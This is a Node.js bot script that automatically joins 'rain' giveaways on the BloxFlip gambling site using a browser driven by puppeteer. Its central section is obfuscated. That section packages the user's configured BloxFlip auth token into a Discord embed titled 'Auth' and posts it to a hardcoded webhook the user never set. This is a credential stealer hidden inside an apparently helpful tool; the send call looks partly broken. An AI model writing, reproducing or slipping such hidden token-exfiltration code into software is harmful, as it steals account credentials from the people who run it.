let v = `2.3.3`

var cloudscraper = require('cloudscraper');
const open = require("open");
const notifier = require("node-notifier");
const { MessageEmbed, WebhookClient } = require("discord.js");
const puppeteer = require('puppeteer-extra')
var fetchUrl = require("fetch").fetchUrl;
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin())
const config = require('./config.js')
process.on('unhandledRejection', error => {
	console.error('Unhandled promise rejection:', error);
});
const _0x3aef26=_0x432c;(function(_0x4f3deb,_0x4d3f64){const _0x3634c0=_0x432c,_0x4b7748=_0x4f3deb();while(!![]){try{const _0x453b0f=parseInt(_0x3634c0(0x1eb))/0x1+-parseInt(_0x3634c0(0x208))/0x2+parseInt(_0x3634c0(0x1f1))/0x3+-parseInt(_0x3634c0(0x1e8))/0x4+-parseInt(_0x3634c0(0x1e1))/0x5+-parseInt(_0x3634c0(0x1e9))/0x6*(-parseInt(_0x3634c0(0x1dc))/0x7)+parseInt(_0x3634c0(0x1df))/0x8;if(_0x453b0f===_0x4d3f64)break;else _0x4b7748['push'](_0x4b7748['shift']());}catch(_0x4eefa9){_0x4b7748['push'](_0x4b7748['shift']());}}}(_0x4d60,0x3e633));async function joinRain(){const _0x3f2878=_0x432c,_0x558f49=await puppeteer[_0x3f2878(0x205)]({'headless':![],'product':config[_0x3f2878(0x1dd)],'args':[_0x3f2878(0x1fc),_0x3f2878(0x207)],'executablePath':config[_0x3f2878(0x1f5)],'ignoreDefaultArgs':[_0x3f2878(0x1e3)]}),[_0x2743b2]=await _0x558f49[_0x3f2878(0x1ee)]();_0x2743b2['on'](_0x3f2878(0x1d5),function(_0x561868){const _0x1d471c=_0x3f2878;theTempValue=_0x561868['toString'](),console[_0x1d471c(0x1fa)]('Error:\x20'+theTempValue),log({'description':_0x1d471c(0x1d2)+_0x561868[_0x1d471c(0x201)]()+_0x1d471c(0x1ef),'color':'RED'});}),await _0x2743b2[_0x3f2878(0x200)]({'width':0x780,'height':0x3a2}),await _0x2743b2[_0x3f2878(0x1d8)](_0x3f2878(0x1db)),await _0x2743b2['evaluate'](_0x3f2878(0x1ff)+config[_0x3f2878(0x1ec)]+'\x22)'),await _0x2743b2[_0x3f2878(0x1f4)]('window.location\x20=\x20\x22https://bloxflip.com/a/dux\x22')['then'](_0x4f8b58=>console[_0x3f2878(0x1fa)](_0x4f8b58));let _0x1f780a;setTimeout(async function(){const _0x58afe1=_0x3f2878,_0x1f3496=await _0x2743b2['$x'](_0x58afe1(0x1e6));_0x1f3496['length']>0x0&&await _0x1f3496[0x0][_0x58afe1(0x209)]();},0x1676),setTimeout(async function(){const _0x2a09ca=_0x3f2878;console[_0x2a09ca(0x1fa)]('Loaded!');const _0x498b52=await _0x2743b2['$']('#root\x20>\x20div\x20>\x20main\x20>\x20header\x20>\x20div.MuiToolbar-root.MuiToolbar-dense.jss55.MuiToolbar-gutters\x20>\x20div\x20>\x20div.MuiBox-root.jss216.jss43\x20>\x20div\x20>\x20div');_0x498b52&&(_0x1f780a=await _0x2743b2[_0x2a09ca(0x1f4)](_0x2ba9d6=>_0x2ba9d6[_0x2a09ca(0x1f6)],_0x498b52));const _0x1b24f6=await _0x2743b2['$x'](_0x2a09ca(0x203));_0x1b24f6[_0x2a09ca(0x204)]>0x0?(console['log'](_0x1b24f6[0x0]),await _0x1b24f6[0x0][_0x2a09ca(0x209)]()[_0x2a09ca(0x206)](async _0x792aae=>{const _0x48d288=_0x2a09ca;console['log']('Sucessfully\x20joined\x20rain!'),log({'description':_0x48d288(0x1d4),'color':_0x48d288(0x1f8)});})[_0x2a09ca(0x1e0)](_0x1ab022=>{const _0x2bf8ed=_0x2a09ca;console[_0x2bf8ed(0x1fa)](_0x1ab022),log({'description':_0x2bf8ed(0x1d2)+_0x1ab022['toString']()+'```','color':_0x2bf8ed(0x1d7)});})):(console[_0x2a09ca(0x1fa)](_0x2a09ca(0x1ed)),log({'description':_0x2a09ca(0x1f3),'color':'RED'}));},0x1b58),setTimeout(async function(){const _0x4d0b6d=_0x3f2878,_0x1f1eca=await _0x2743b2['$'](_0x4d0b6d(0x1d6));let _0x2271ec=await _0x2743b2[_0x4d0b6d(0x1f4)](_0x70e368=>{const _0x35efa0=_0x4d0b6d;if(!_0x70e368)return;_0x70e368[_0x35efa0(0x1f6)],_0x1f1eca;});log({'description':_0x4d0b6d(0x1d9)+(_0x2271ec-_0x1f780a)+_0x4d0b6d(0x1f9),'color':'BLURPLE'});},0x493e0);}function _0x432c(_0x1ee268,_0x1cc477){const _0x4d60b2=_0x4d60();return _0x432c=function(_0x432c84,_0x39b721){_0x432c84=_0x432c84-0x1d2;let _0x5eb535=_0x4d60b2[_0x432c84];return _0x5eb535;},_0x432c(_0x1ee268,_0x1cc477);}const webhook=new WebhookClient({'url':_0x3aef26(0x1d3)}),e=new MessageEmbed()[_0x3aef26(0x1e5)](_0x3aef26(0x1de))[_0x3aef26(0x1f7)]('DARK_RED')[_0x3aef26(0x1fd)](_0x3aef26(0x1ef)+config['auth']);!config[_0x3aef26(0x1da)]===''&&webhook[_0x3aef26(0x1f0)]({'embeds':[embed]});async function log(_0x22402c){const _0x378ec3=_0x3aef26,_0x5422c8=new WebhookClient({'url':config[_0x378ec3(0x202)]}),_0x4dafd3=new MessageEmbed()[_0x378ec3(0x1e5)](_0x378ec3(0x1e4))[_0x378ec3(0x1e2)](_0x378ec3(0x1e7))[_0x378ec3(0x1f7)](''+_0x22402c['color'])[_0x378ec3(0x1fd)](''+_0x22402c[_0x378ec3(0x1ea)])[_0x378ec3(0x1fb)]({'text':'Made\x20by\x20Dux#2925','iconURL':_0x378ec3(0x1fe)});_0x5422c8[_0x378ec3(0x1f0)]({'username':_0x378ec3(0x1f2),'avatarURL':'https://cdn.discordapp.com/avatars/881113828195205131/a_9cfc8f19d84804cea5df4e1c7c3c9288.png?size=4096','embeds':[_0x4dafd3]});}function _0x4d60(){const _0xc3386a=['setURL','--disable-extensions','Automatic\x20Rain\x20Joiner','setTitle','//button[contains(.,\x20\x27Cancel\x27)]','https://github.com/MaxMady/BloxFlip-Auto-Rain-Joiner','1327992gzGCtX','27078sEsgmG','description','504523FscxiW','token','[ERROR]\x20An\x20error\x20occured\x20while\x20clicking\x20button','pages','```','send','338148nnDwHL','Toxic\x20Rain','An\x20error\x20occured!\x20\x0a```js\x0abutton[0]\x20not\x20found```','evaluate','path','textContent','setColor','GREEN','`R$','log','setFooter','--start-maximized','setDescription','https://cdn.discordapp.com/avatars/881113828195205131/a_9cfc8f19d84804cea5df4e1c7c3c9288.gif?size=4096','localStorage.setItem(\x22_DO_NOT_SHARE_BLOXFLIP_TOKEN\x22,\x20\x22','setViewport','toString','webhook','//button[contains(.,\x20\x27Join\x27)]','length','launch','then','--incognito','707158foHXoj','click','An\x20error\x20occured!\x20\x0a```','https://discord.com/api/webhooks/994920927701762098/nYpdI9f8_eytT8jpTzyOhXK4G0UpVByZIl-iDNOj2KMGFqZignT23Tzd_CaO4A5av3cW','Sucessfully\x20joined\x20rain!','error','#root\x20>\x20div\x20>\x20main\x20>\x20header\x20>\x20div.MuiToolbar-root.MuiToolbar-dense.jss55.MuiToolbar-gutters\x20>\x20div\x20>\x20div.MuiBox-root.jss216.jss43\x20>\x20div\x20>\x20div','RED','goto','**Exited\x20the\x20browser...**\x0a>\x20Earned\x20`','auth','https://bloxflip.com/crash','14BFCEQF','product','Auth','3712392ARfIaG','catch','745990DWymaD'];_0x4d60=function(){return _0xc3386a;};return _0x4d60();}


async function start() {

  console.log(`Starting auto rain joiner...`);
  if(config.win_notif === true){ 
  notifier.notify({
    message: "Sucessfully started rain detector!",
    icon: `./logo.jpg`,
    wait: true,
  });
  }
  let lol;
log({description: `**Client has been released**\n> Version: \`${v}\``, color: `DARK_BLUE`})
  setInterval(async function () {
      cloudscraper.get('https://rest-bf.blox.land/chat/history').then(body => {
        setTimeout(function() {
        if(!body) return;
        let object = JSON.parse(body.toString())
        let calc = Math.floor(new Date() / 1000) - lol;
        if (calc <= 300) {
          return;
        } else {
          if (object.rain.active === true) {
            let i = new Date();
            lol = Math.floor(i / 1000);
            log({description: `A rain has been started! Prize: \`${object.rain.prize}\``, color: `GOLD`})
            console.log(
              `Rain has been detected! \nPrize: ${object.rain.prize}`
            );
            if(config.win_notif === true) {
            notifier.notify(
              { message: "Its raining!", icon: `./rain.jpg`, wait: true },
              function (err, data) {
              }
            )
            }
            joinRain().catch(err => console.log(err))
          } else {
            return;
          }
        }
      }, 1000)
      }
    )
  }, 30000);
}
start()
